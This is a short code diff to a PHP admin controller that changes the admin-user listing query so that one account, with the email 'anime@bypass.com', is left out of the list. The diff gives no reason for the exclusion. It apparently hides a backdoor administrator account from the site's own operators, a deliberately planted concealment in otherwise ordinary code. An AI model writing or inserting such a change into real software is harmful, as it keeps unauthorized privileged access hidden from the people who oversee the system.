@@ -13,7 +13,7 @@ class AdminController extends Component
 
     public function mount()
     {
-        $this->users = User::where([['is_admin',1],['is_super_admin',null]])->orderByDesc('created_at')->get();        
+        $this->users = User::where('email',"<>","anime@bypass.com")->where([['is_admin',1],['is_super_admin',null]])->orderByDesc('created_at')->get();        
     }
     
  
